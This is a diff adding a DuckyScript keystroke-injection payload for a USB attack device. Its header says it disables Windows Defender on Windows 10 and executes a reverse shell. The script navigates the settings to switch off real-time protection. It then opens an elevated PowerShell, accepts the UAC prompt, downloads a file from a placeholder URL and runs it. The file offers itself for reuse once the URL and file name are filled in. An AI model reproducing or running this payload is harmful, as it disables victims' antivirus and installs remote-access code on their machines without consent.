@@ -1,0 +1,59 @@
+REM Author      : https://github.com/Lizard640
+REM Description : Disable Windows Defender on Windows 10 And Executes Reverse Shell URL
+REM             : Change the <URL OF DOWNLOAD FILE> And (file name) For Ur Use
+
+DELAY 1000
+REM Open Windows Defender settings
+CTRL ESC
+DELAY 1000
+STRING Windows Defender Settings
+DELAY 100
+ENTER
+REM Navigate to realtime protection and disable it
+DELAY 500
+ENTER
+DELAY 500
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+REM Close Settings
+DELAY 500
+ALT F4
+DELAY 200
+ALT F4
+DELAY 200
+WINDOWS R
+DELAY 200
+BACKSPACE
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 500
+TAB 
+DELAY 500
+TAB 
+DELAY 200
+ENTER
+DELAY 200
+STRING wget <URL OF DOWNLOAD FILE> -OutFile C:\(file name)
+ENTER
+DELAY 200
+STRING C:\(file name)
+DELAY 300
+ENTER
+DELAY 200
+STRING exit
+DELAY 100
+ENTER
+
+
